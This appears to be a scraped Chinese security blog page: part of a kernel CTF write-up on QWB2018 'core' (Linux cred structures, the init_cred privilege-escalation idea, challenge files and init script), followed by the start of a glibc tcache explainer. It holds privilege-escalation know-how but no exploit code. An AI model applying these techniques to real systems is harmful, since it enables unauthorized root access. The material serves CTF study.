class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux/include/linux/cred.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __put_cred(<span class="keyword">struct</span> cred *);</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">exit_creds</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">copy_creds</span><span class="params">(<span class="keyword">struct</span> task_struct *, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="keyword">struct</span> cred *<span class="title function_">get_task_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">cred_alloc_blank</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_creds</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_exec_creds</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">abort_creds</span><span class="params">(<span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="keyword">struct</span> cred *<span class="title function_">override_creds</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">revert_creds</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">change_create_files_as</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="keyword">struct</span> inode *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_security_override</span><span class="params">(<span class="keyword">struct</span> cred *, u32)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_security_override_from_ctx</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="type">const</span> <span class="type">char</span> *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_create_files_as</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="keyword">struct</span> inode *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">cred_fscmp</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *, <span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>
<p>函数实现和<code>init_cred</code>这个预定义对象都在<code>linux/kernel/cred.c</code>中实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_ROOT_UID KUIDT_INIT(0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_ROOT_GID KGIDT_INIT(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">	.usage			= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	.subscribers		= ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">	.magic			= CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	.uid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.gid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.suid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.sgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.euid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.egid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.fsuid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.fsgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.securebits		= SECUREBITS_DEFAULT,</span><br><span class="line">	.cap_inheritable	= CAP_EMPTY_SET,</span><br><span class="line">	.cap_permitted		= CAP_FULL_SET,</span><br><span class="line">	.cap_effective		= CAP_FULL_SET,</span><br><span class="line">	.cap_bset		= CAP_FULL_SET,</span><br><span class="line">	.user			= INIT_USER,</span><br><span class="line">	.user_ns		= &amp;init_user_ns,</span><br><span class="line">	.group_info		= &amp;init_groups,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个init_cred是一个具有最高权限的cred,可以考虑使用它或者其拷贝进行提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_creds - Prepare a new set of credentials for modification</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a new set of task credentials for modification.  A task&#x27;s creds</span></span><br><span class="line"><span class="comment"> * shouldn&#x27;t generally be modified directly, therefore this function is used to</span></span><br><span class="line"><span class="comment"> * prepare a new copy, which the caller then modifies and then commits by</span></span><br><span class="line"><span class="comment"> * calling commit_creds().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Preparation involves making a copy of the objective creds for modification.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns a pointer to the new creds-to-be if successful, NULL otherwise.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Call commit_creds() or abort_creds() to clean up.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_creds</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	validate_process_creds();</span><br><span class="line"></span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">	old = task-&gt;cred;</span><br><span class="line">	<span class="built_in">memcpy</span>(new, old, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred));</span><br><span class="line"></span><br><span class="line">	new-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">	<span class="type">atomic_set</span>(&amp;new-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(new, <span class="number">0</span>);</span><br><span class="line">	get_group_info(new-&gt;group_info);</span><br><span class="line">	get_uid(new-&gt;user);</span><br><span class="line">	get_user_ns(new-&gt;user_ns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	key_get(new-&gt;session_keyring);</span><br><span class="line">	key_get(new-&gt;process_keyring);</span><br><span class="line">	key_get(new-&gt;thread_keyring);</span><br><span class="line">	key_get(new-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	new-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(new, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	validate_creds(new);</span><br><span class="line">	<span class="keyword">return</span> new;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	abort_creds(new);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_creds);</span><br></pre></td></tr></table></figure>
<h3 id="强网杯2018-core">强网杯2018-core</h3>
<p>给了四个东西bzImage core.cpio start.sh vmlinux,其中</p>
<p>bzImage是内核镜像</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.15.8 (simple@vps-simple) <span class="comment">#19 SMP Mon Mar 19 18:50:28 CST 2018, RO-rootFS, swap_dev 0x6, Normal VGA</span></span><br></pre></td></tr></table></figure>
<p>vmlinux是带符号表的elf文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=1d8344e71a82bc43821029796ef65bebfe8e65c3, not stripped</span><br></pre></td></tr></table></figure>
<p><code>start.sh</code>是<code>qemu</code>启动内核的脚本,</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# <span class="built_in">cat</span> start.sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>
<p><code>-initrd  ./core.cpio</code>指定使用<code>core.cpio</code>作为内存文件系统</p>
<p><code>kaslr</code>开启了内核地址随机化</p>
<p><code>-s</code> 开启了调试</p>
<p>解包core.cpio看看文件系统里有啥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# file core.cpio</span><br><span class="line">core.cpio: gzip compressed data, last modified: Fri Oct  5 14:08:36 2018, max compression, from Unix</span><br></pre></td></tr></table></figure>
<p>发现首先有一层gzip压缩</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# mkdir core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# cp core.cpio ./core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player# cd core</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# mv core.cpio core.cpio.gz</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# gunzip core.cpio.gz</span><br><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# file core.cpio</span><br><span class="line">core.cpio: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>
<p>这时候已经没有gzip包了,是一个cpio归档文件,解包用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/ctf-challenges/pwn/kernel/QWB2018-core/give_to_player/core# cpio -idm &lt; core.cpio</span><br></pre></td></tr></table></figure>
<p>解包之后是一个linux目录树,值得注意的是根目录下有两个shell脚本,gen_cpio.sh和init</p>
<p>这个gen_cpio.sh会递归查找当前目录为根的目录树打包成cpio归档文件,也就是制作文件系统用的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>其中有五条关键指令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms		//将kallsyms内核符号表拷贝到.tmp下面,这就意味着普通用户可以读取</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict		//不允许普通用户读取kallsyms内核符号</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict	//不允许普通用户读取dmesg内核消息</span><br><span class="line">insmod /core.ko			//加载了一个内核模块叫core	</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh		//当前用户<span class="built_in">id</span>为1000,不是root</span><br></pre></td></tr></table></figure>
<p>ida64打开core.ko看看是什么东西</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/10/28/tcache/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/28/tcache/" class="post-title-link" itemprop="url">glibc2.27 tcache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-28 01:53:00 / Modified: 01:53:53" itemprop="dateCreated datePublished" datetime="2023-10-28T01:53:00+08:00">2023-10-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="tcache">tcache</h1>
<p>glibc2.26之后</p>
<p>"如为死狂，则事无不成。"--&lt;<最后的武士>&gt;</p>
<h2 id="datastructure">datastructure</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"><span class="comment">//根据tcache下标求解其中堆块的大小</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">//根据堆块大小求解对应tcache下标</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"><span class="comment">//根据堆块的mem区大小,首先计算得到堆块的整体大小(包括元数据)然后计算对应tcache下标</span></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>tcache桶子下标</th>
<th>mem大小范围</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0x18</td>
<td></td>
</tr>
<tr>
<td>1</td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td></td>
<td></td>
</tr>
<tr>
<td>...</td>
<td></td>
<td></td>
</tr>
<tr>
<td>63</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h3
id="tcache_perthread_struct类定义">tcache_perthread_struct类定义</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"><span class="comment">//本堆块的mem区域第一个int被复用为next指针</span></span><br><span class="line"><span class="comment">//单向链表,next指针指向下一个空闲堆块的mem区域</span></span><br></pre></td></tr></table></figure>
<p>每个线程都有自己的tcache</p>
<p>也就是说,一个线程有一个<code>tcache_perthread_struct</code>结构体</p>
<p>counts[tidx]是计数器,记录tidx下标的tcache桶子中有几个堆块</p>
<p>entries[tidx]是链表头,指向tidx桶子中的第一个堆块</p>
<p>每个桶子中最多有<code>TCACHE_FILL_COUNT=7</code>个堆块,每个tcache_perthread_struct中有64个桶子</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20231027112655389.png"
alt="image-20231027112655389" />
<figcaption aria-hidden="true">image-20231027112655389</figcaption>
</figure>
<h3 id="成员函数">成员函数</h3>
